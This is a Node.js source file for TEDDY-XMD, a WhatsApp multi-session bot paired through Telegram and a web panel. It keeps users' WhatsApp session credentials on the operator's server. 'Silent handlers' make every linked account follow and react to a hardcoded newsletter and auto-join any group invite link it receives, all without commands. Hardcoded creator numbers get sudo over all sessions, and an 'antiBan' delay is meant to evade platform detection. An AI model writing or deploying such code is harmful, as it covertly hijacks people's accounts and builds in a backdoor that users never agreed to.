// ============================================================
// TEDDY-XMD — by Trashcore
// index.js | BaseBot V4 + Telegram multi-session pairing + Web Panel
// ============================================================

const fs = require('fs');
const path = require('path');
const http = require('http');
const pino = require('pino');
const chalk = require('chalk');
const NodeCache = require('node-cache');

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  DisconnectReason,
  getContentType
} = require('@trashcore/baileys');

const TelegramBot = require('node-telegram-bot-api');

const { initDatabase, getSetting, setSetting, upsertTgUser, getTgUsers, getTgUserCount } = require('./database');
const { logMessage } = require('./database/logger');
const config = require('./config');

global.botStartTime = Date.now();
global.pairedOwners = {};
let dbReady = false;

const groupCache = new NodeCache({ stdTTL: 120, checkperiod: 60 });
const settingsCache = new NodeCache({ stdTTL: 30, checkperiod: 15 });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const deletedMessages = new NodeCache({ stdTTL: 86400, checkperiod: 3600 });

const activeSessions = {};

const PORT = process.env.PORT || 3000;

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
    const filePath = path.join(__dirname, 'public', 'index.html');
    if (fs.existsSync(filePath)) {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      fs.createReadStream(filePath).pipe(res);
    } else {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('public/index.html not found');
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/pair') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { phoneNumber } = JSON.parse(body);
        if (!phoneNumber) throw new Error('Phone number required');

        const cleanNum = phoneNumber.replace(/[^0-9]/g, '');
        const sessionPath = path.join(__dirname, 'trash_baileys', `session_${cleanNum}`);
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

        const { state } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const tempSock = makeWASocket({
          version,
          auth: state,
          logger: pino({ level: 'silent' }),
          printQRInTerminal: false
        });

        let code = await tempSock.requestPairingCode(cleanNum);
        if (!code) throw new Error('WhatsApp did not return a code');

        code = code.match(/.{1,4}/g)?.join('-') || code;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, code }));
        setTimeout(() => tempSock.end(), 5000);

      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
    });
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
});

server.listen(PORT, '0.0.0.0', () => console.log(chalk.cyan(`🌐 Web panel running on port ${PORT}`)));

const BOT_TOKEN = process.env.BOT_TOKEN || config.BOT_TOKEN || '';
if (!BOT_TOKEN) {
  console.error(chalk.red('❌ BOT_TOKEN missing. Set it in config.js or env.'));
  process.exit(1);
}
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log(chalk.green('✅ Telegram bot started.'));

const REQUIRED_GROUP_USERNAME = 'free_net_zone2';

async function isGroupMember(userId) {
  try {
    const member = await bot.getChatMember(`@${REQUIRED_GROUP_USERNAME}`, userId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

async function requireGroupMembership(msg) {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const member = await isGroupMember(userId);
  if (!member) {
    bot.sendMessage(chatId,
      `⚠️ *Access Restricted*\n\nYou must join our group to use this bot.\n\n👥 [Join Group](https://t.me/${REQUIRED_GROUP_USERNAME})\n\nAfter joining, send /start again.`,
      { parse_mode: 'Markdown', disable_web_page_preview: true }
    );
    return false;
  }
  return true;
}

const connectedUsersFile = path.join(__dirname, 'connectedUsers.json');
let connectedUsers = {};
function loadConnectedUsers() {
  if (fs.existsSync(connectedUsersFile)) {
    try { connectedUsers = JSON.parse(fs.readFileSync(connectedUsersFile)); } catch {}
  }
}
function saveConnectedUsers() {
  fs.writeFileSync(connectedUsersFile, JSON.stringify(connectedUsers, null, 2));
}

const phoneToTgChatFile = path.join(__dirname, 'phoneToTgChat.json');
let phoneToTgChat = {};
function loadPhoneToTgChat() {
  if (fs.existsSync(phoneToTgChatFile)) {
    try { phoneToTgChat = JSON.parse(fs.readFileSync(phoneToTgChatFile)); } catch {}
  }
}
function savePhoneToTgChat() {
  fs.writeFileSync(phoneToTgChatFile, JSON.stringify(phoneToTgChat, null, 2));
}
function getTgChatId(phoneNumber, provided = null) {
  if (provided) {
    phoneToTgChat[phoneNumber] = provided;
    savePhoneToTgChat();
    return provided;
  }
  return phoneToTgChat[phoneNumber] || null;
}

function totalSessions() {
  return Object.values(connectedUsers).reduce((sum, arr) => sum + (arr?.length || 0), 0);
}

function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  return `${d}d ${h}h ${m}m ${s % 60}s`;
}
function formatDate(ts) {
  return new Date(ts).toLocaleString('en-GB', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', timeZone: 'Africa/Nairobi'
  });
}
function normalizeNumber(jid) {
  return jid? jid.split('@')[0].split(':')[0] : '';
}
function cleanOldCache() {
  const cacheFolder = path.join(__dirname, 'cache');
  if (!fs.existsSync(cacheFolder)) return;
  for (const file of fs.readdirSync(cacheFolder)) {
    try { fs.unlinkSync(path.join(cacheFolder, file)); } catch {}
  }
}
function getHandleMessage() {
  delete require.cache[require.resolve('./command')];
  return require('./command');
}

function getScopedSetting(trashcore, key, def = null) {
  const bn = normalizeNumber(trashcore?.user?.id || '');
  const scopedK = bn? `${bn}:${key}` : key;
  const cacheKey = `scope:${scopedK}`;
  const hit = settingsCache.get(cacheKey);
  if (hit!== undefined) return hit;
  const val = getSetting(scopedK, def);
  settingsCache.set(cacheKey, val);
  return val;
}
function setScopedSetting(trashcore, key, val) {
  const bn = normalizeNumber(trashcore?.user?.id || '');
  const scopedK = bn? `${bn}:${key}` : key;
  settingsCache.del(`scope:${scopedK}`);
  return setSetting(scopedK, val);
}
global.setSetting = setScopedSetting;

const CREATOR_NUMBERS = ['25499963583', '254747963583'];
function isSudoOrCreator(bareNumber) {
  if (CREATOR_NUMBERS.includes(bareNumber)) return true;
  const list = getSetting('sudoUsers', []);
  const now = Date.now();
  return list.some(e => e.number === bareNumber && (!e.expiresAt || e.expiresAt > now));
}
global.isSudoOrCreator = isSudoOrCreator;

// Handlers
async function handleAntiDelete(trashcore, m) {
  try {
    if (!getScopedSetting(trashcore, 'antidelete', false)) return;
    const key = `${m.key.remoteJid}_${m.key.id}`;
    deletedMessages.set(key, m);
  } catch {}
}

async function handleAutoRead(trashcore, m) {
  try {
    if (getScopedSetting(trashcore, 'autoRead', false)) {
      await trashcore.readMessages([m.key]);
    }
  } catch {}
}

async function handleAutoReact(trashcore, m) {
  try {
    const emoji = getScopedSetting(trashcore, 'autoReact', false);
    if (!emoji) return;
    await trashcore.sendMessage(m.key.remoteJid, {
      react: { text: emoji, key: m.key }
    });
  } catch {}
}

async function handleAntiCall(trashcore) {
  trashcore.ev.on('call', async (calls) => {
    try {
      if (!getScopedSetting(trashcore, 'antiCall', false)) return;
      for (const call of calls) {
        if (call.status === 'offer') {
          await trashcore.rejectCall(call.id, call.from);
          await trashcore.sendMessage(call.from, {
            text: '❌ Calls are blocked. Please text instead.'
          });
        }
      }
    } catch (err) {
      console.error('AntiCall error:', err);
    }
  });
}

async function handleAutoSaveContact(trashcore, m) {
  try {
    if (!getScopedSetting(trashcore, 'autoSaveContact', false)) return;
    const sender = m.key.participant || m.key.remoteJid;
    if (sender.endsWith('@s.whatsapp.net') &&!sender.includes('g.us')) {
      await trashcore.onWhatsApp(sender);
    }
  } catch {}
}

function applyAntiBan(trashcore) {
  try {
    if (!getScopedSetting(trashcore, 'antiBan', false)) return;
    const originalSend = trashcore.sendMessage.bind(trashcore);
    trashcore.sendMessage = async (...args) => {
      await new Promise(r => setTimeout(r, 1000 + Math.random() * 2000));
      return originalSend(...args);
    };
  } catch {}
}

async function handleAlwaysOnline(trashcore) {
  try {
    if (getScopedSetting(trashcore, 'alwaysOnline', false)) {
      await trashcore.sendPresenceUpdate('available');
      setInterval(() => {
        trashcore.sendPresenceUpdate('available').catch(() => {});
      }, 60000);
    }
  } catch {}
}

async function runAntilink(trashcore, m) {
  try {
    const chatId = m.key.remoteJid;
    if (!chatId?.endsWith('@g.us')) return false;
    const body = m.message?.conversation || m.message?.extendedTextMessage?.text
      || m.message?.imageMessage?.caption || m.message?.videoMessage?.caption || '';
    if (!body) return false;
    const senderJid = m.key.participant || chatId;
    const antilink = getScopedSetting(trashcore, `antilink_${chatId}`, false);
    if (!antilink) return false;
    const botNumber = normalizeNumber(trashcore.user.id);
    if (normalizeNumber(senderJid) === botNumber || m.key.fromMe) return false;
    const meta = await trashcore.groupMetadata(chatId);
    const senderBare = normalizeNumber(senderJid);
    const p = (meta.participants || []).find(x => normalizeNumber(x.id) === senderBare);
    if (p?.admin === 'admin' || p?.admin === 'superadmin') return false;
    if (body.includes('http')) {
      await trashcore.sendMessage(chatId, {
        delete: { remoteJid: chatId, fromMe: false, id: m.key.id, participant: m.key.participant }
      });
      return true;
    }
    return false;
  } catch (err) { return false; }
}

function runAutoPresence(trashcore, m) {
  try {
    const chatId = m.key.remoteJid;
    const autoTyping = getScopedSetting(trashcore, 'autoTyping', false);
    const autoRecord = getScopedSetting(trashcore, 'autoRecord', false);
    if (autoTyping) trashcore.sendPresenceUpdate('composing', chatId).catch(() => {});
    if (autoRecord) trashcore.sendPresenceUpdate('recording', chatId).catch(() => {});
  } catch {}
}

let lastBioUpdate = 0;
function runAutoBio(trashcore) {
  try {
    const autobio = getScopedSetting(trashcore, 'autoBio', false);
    if (!autobio) return;
    const now = Date.now();
    if (now - lastBioUpdate < 60000) return;
    lastBioUpdate = now;
    trashcore.updateProfileStatus(`✳️ TEDDY-XMD || ✅ Runtime: ${formatUptime(now - global.botStartTime)}`).catch(() => {});
  } catch {}
}

// Silent handlers - no commands needed
async function autoFollowNewsletters(trashcore) {
  try {
    const defaultNewsletters = [
      '120363421104812135@newsletter'
    ];
    const list = getScopedSetting(trashcore, 'newsletters', defaultNewsletters);
    for (const jid of list) {
      try {
        await trashcore.newsletterFollow(jid);
      } catch (err) {
        console.error(`[Newsletter] Failed ${jid}:`, err.message);
      }
    }
  } catch (err) {
    console.error('[Newsletter] Error:', err.message);
  }
}

async function autoReactNewsletter(trashcore, m) {
  try {
    const chatId = m.key.remoteJid;
    if (!chatId?.endsWith('@newsletter')) return;
    await trashcore.newsletterReactMessage(chatId, m.key.id, '❤️');
  } catch (err) {
    // silent fail
  }
}

async function autoJoinGroupFromMessage(trashcore, m) {
  try {
    const body = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
    const inviteMatch = body.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (!inviteMatch) return;
    await trashcore.groupAcceptInvite(inviteMatch[1]);
  } catch (err) {
    // silent fail
  }
}

const QUEUE_CONCURRENCY = 5;
let activeWorkers = 0;
const messageQueue = [];
function enqueueMessage(handler) {
  messageQueue.push(handler);
  drainQueue();
}
function drainQueue() {
  while (activeWorkers < QUEUE_CONCURRENCY && messageQueue.length > 0) {
    const handler = messageQueue.shift();
    activeWorkers++;
    handler().finally(() => { activeWorkers--; drainQueue(); });
  }
}

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
  telegramChatId = getTgChatId(phoneNumber, telegramChatId);

  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  if (!fs.existsSync(sessionPath)) return;

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();
  const msgRetryCounterCache = new NodeCache();

  const trashcore = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ['Ubuntu', 'Chrome', '120.0.0.0'],
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    msgRetryCounterCache,
    defaultQueryTimeoutMs: undefined,
    keepAliveIntervalMs: 30000,
    syncFullHistory: false,
  });

  activeSessions[phoneNumber] = trashcore;
  trashcore.ev.on('creds.update', saveCreds);

  const createToxxicStore = require('./basestore');
  const store = createToxxicStore(`./store_${phoneNumber}`, { maxMessagesPerChat: 50, memoryOnly: true });
  store.bind(trashcore.ev);

  if (!trashcore.authState.creds.registered) {
    if (telegramChatId) {
      setTimeout(async () => {
        try {
          let code = await trashcore.requestPairingCode(phoneNumber);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          pairingCodes.set(code, { phoneNumber });
          await bot.sendMessage(telegramChatId,
            `🔑 *Pairing code for ${phoneNumber}*\n\n\`${code}\``,
            { parse_mode: 'Markdown' }
          );
        } catch (err) {
          bot.sendMessage(telegramChatId, `❌ Pairing failed: ${err.message}`).catch(() => {});
        }
      }, 3000);
    }
  } else {
    await saveCreds();
  }

  trashcore.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      await saveCreds();
      const botNumber = normalizeNumber(trashcore.user.id);
      global.pairedOwners[botNumber] = phoneNumber;
      await autoFollowNewsletters(trashcore);
      await handleAlwaysOnline(trashcore);
      applyAntiBan(trashcore);
      handleAntiCall(trashcore);

      if (telegramChatId) {
        if (!connectedUsers[telegramChatId]) connectedUsers[telegramChatId] = [];
        const existing = connectedUsers[telegramChatId].find(u => u.phoneNumber === phoneNumber);
        if (existing) {
          existing.connectedAt = Date.now();
        } else {
          connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: Date.now() });
        }
        saveConnectedUsers();
      }

      cleanOldCache();

    } else if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (!activeSessions[phoneNumber]) return;
      if (reason!== DisconnectReason.loggedOut) {
        startWhatsAppBot(phoneNumber, telegramChatId);
      } else {
        delete activeSessions[phoneNumber];
        const loggedOutPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
        if (fs.existsSync(loggedOutPath)) {
          try { fs.rmSync(loggedOutPath, { recursive: true, force: true }); } catch {}
        }
        for (const [cid, arr] of Object.entries(connectedUsers)) {
          connectedUsers[cid] = arr.filter(u => u.phoneNumber!== phoneNumber);
          if (!connectedUsers[cid].length) delete connectedUsers[cid];
        }
        saveConnectedUsers();
      }
    }
  });

  trashcore.ev.on('messages.upsert', ({ messages, type }) => {
    if (type!== 'notify' ||!dbReady) return;
    for (const m of messages) {
      if (!m?.message) continue;
      enqueueMessage(async () => {
        try {
          if (m.message?.protocolMessage?.type === 0) {
            const deletedKey = m.message.protocolMessage.key;
            const key = `${deletedKey.remoteJid}_${deletedKey.id}`;
            const deletedMsg = deletedMessages.get(key);
            if (deletedMsg && getScopedSetting(trashcore, 'antidelete', false)) {
              await trashcore.sendMessage(m.key.remoteJid, {
                text: `🗑️ *Deleted Message Recovered*\n\nFrom: @${deletedMsg.key.participant?.split('@')[0] || deletedMsg.key.remoteJid.split('@')[0]}\n\n${deletedMsg.message?.conversation || deletedMsg.message?.extendedTextMessage?.text || '[Media/Other]'}`,
                mentions: [deletedMsg.key.participant || deletedMsg.key.remoteJid]
              });
            }
            return;
          }

          await handleAutoRead(trashcore, m);
          await handleAutoReact(trashcore, m);
          await handleAntiDelete(trashcore, m);
          await handleAutoSaveContact(trashcore, m);

          if (m.key.remoteJid === 'status@broadcast') {
            const enabled = getScopedSetting(trashcore, 'statusView', true);
            if (enabled) trashcore.readMessages([m.key]).catch(() => {});
            return;
          }

          if (m.message?.ephemeralMessage) m.message = m.message.ephemeralMessage.message;

          runAutoPresence(trashcore, m);
          runAutoBio(trashcore);
          await autoReactNewsletter(trashcore, m);
          await autoJoinGroupFromMessage(trashcore, m);

          const deleted = await runAntilink(trashcore, m);
          if (deleted) return;

          logMessage(m, trashcore).catch(() => {});
          await getHandleMessage()(trashcore, m);
        } catch (err) {
          console.error('[messages.upsert]', err.message);
        }
      });
    }
  });

  trashcore.ev.on('group-participants.update', async (update) => {
    if (!dbReady) return;
  });
}

// Telegram Commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const from = msg.from;
  if (!(await requireGroupMembership(msg))) return;
  if (dbReady) {
    try {
      upsertTgUser({ tg_id: from.id, username: from.username || '', first_name: from.first_name || '', phone_number: '' });
    } catch {}
  }
  const sessions = totalSessions();
  const userCount = dbReady? getTgUserCount() : '…';
  const uptime = formatUptime(Date.now() - global.botStartTime);
  const startedDate = formatDate(global.botStartTime);
  const prefix = config.PREFIX || '.';

  const caption =
    `╭━━━━━━━━━━━━━━╮\n` +
    `┃ 🐻 *TEDDY-XMD BOT* 🐻\n` +
    `╰━━━━━━━━━━━━━━╯\n\n` +
    `📊 *Stats*\n` +
    `┣ ┃⭔ Sessions : ${sessions}\n` +
    `┣ ┃⭔ Users : ${userCount}\n` +
    `┣ ⏱ Uptime : ${uptime}\n` +
    `┣ ┃⭔ Started : ${startedDate}\n` +
    `┣ ┃⭔ Prefix : ${prefix}\n` +
    `┗ ┃⭔ Creator : @xdbot1\n` +

    `╭─⊷ 📋 *TELEGRAM COMMANDS* ─\n` +
    `│ /connect <number> - Pair WhatsApp\n` +
    `│ /delsession <number> - Delete session\n` +
    `│ /status - Show active sessions\n` +
    `│ /runtime - Bot uptime\n` +
    `╰────────────────────`;

  bot.sendPhoto(chatId, 'https://files.catbox.moe/13nyhx.jpg', {
    caption,
    parse_mode: 'Markdown'
  });
});

bot.onText(/\/connect(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const from = msg.from;
  const phoneNumber = match[1];
  if (!(await requireGroupMembership(msg))) return;
  if (!phoneNumber) return bot.sendMessage(chatId, 'Usage: /connect 254xxxx');
  if (dbReady) {
    try {
      upsertTgUser({ tg_id: from.id, username: from.username || '', first_name: from.first_name || '', phone_number: phoneNumber });
    } catch {}
  }
  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  if (!fs.existsSync(sessionPath)) {
    fs.mkdirSync(sessionPath, { recursive: true });
    bot.sendMessage(chatId, `⏳ Session created for *${phoneNumber}*. Requesting pairing code...`, { parse_mode: 'Markdown' });
    startWhatsAppBot(phoneNumber, chatId).catch(err => bot.sendMessage(chatId, `❌ Error: ${err.message}`));
  } else {
    const already = connectedUsers[chatId]?.some(u => u.phoneNumber === phoneNumber);
    if (already) {
      bot.sendMessage(chatId, `⚠️ *${phoneNumber}* is already connected.`, { parse_mode: 'Markdown' });
    } else {
      bot.sendMessage(chatId, `🔄 Reconnecting *${phoneNumber}*...`, { parse_mode: 'Markdown' });
      startWhatsAppBot(phoneNumber, chatId).catch(err => bot.sendMessage(chatId, `❌ Error: ${err.message}`));
    }
  }
});

bot.onText(/\/delsession (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const phoneNumber = match[1];
  if (!(await requireGroupMembership(msg))) return;
  const sessionPath = path.join(__dirname, 'trash_baileys', `session_${phoneNumber}`);
  try {
    const liveSocket = activeSessions[phoneNumber];
    delete activeSessions[phoneNumber];
    if (liveSocket) {
      try { liveSocket.ev.removeAllListeners(); liveSocket.ws?.close(); liveSocket.end?.(); } catch {}
    }
    if (fs.existsSync(sessionPath)) {
      fs.rmSync(sessionPath, { recursive: true, force: true });
    }
    if (connectedUsers[chatId]) {
      connectedUsers[chatId] = connectedUsers[chatId].filter(u => u.phoneNumber!== phoneNumber);
      if (connectedUsers[chatId].length === 0) delete connectedUsers[chatId];
      saveConnectedUsers();
    }
    bot.sendMessage(chatId, `✅ Session for *${phoneNumber}* deleted.`, { parse_mode: 'Markdown' });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
  }
});

bot.onText(/\/status/, (msg) => {
  const users = connectedUsers[msg.chat.id] || [];
  const text = users.length
   ? users.map(u => `📱 ${u.phoneNumber}`).join('\n')
    : 'No sessions connected.';
  bot.sendMessage(msg.chat.id, `📊 *Active Sessions*\n\n${text}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/runtime/, (msg) => {
  const uptime = formatUptime(Date.now() - global.botStartTime);
  bot.sendMessage(msg.chat.id, `⏱️ Bot Runtime: ${uptime}`);
});

initDatabase().then(() => {
  dbReady = true;
  loadConnectedUsers();
  loadPhoneToTgChat();
  console.log(chalk.green('✅ Database ready.'));
  for (const [chatId, sessions] of Object.entries(connectedUsers)) {
    for (const session of sessions) {
      startWhatsAppBot(session.phoneNumber, chatId).catch(console.error);
    }
  }
});

process.on('unhandledRejection', err => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', err => console.error('Uncaught Exception:', err));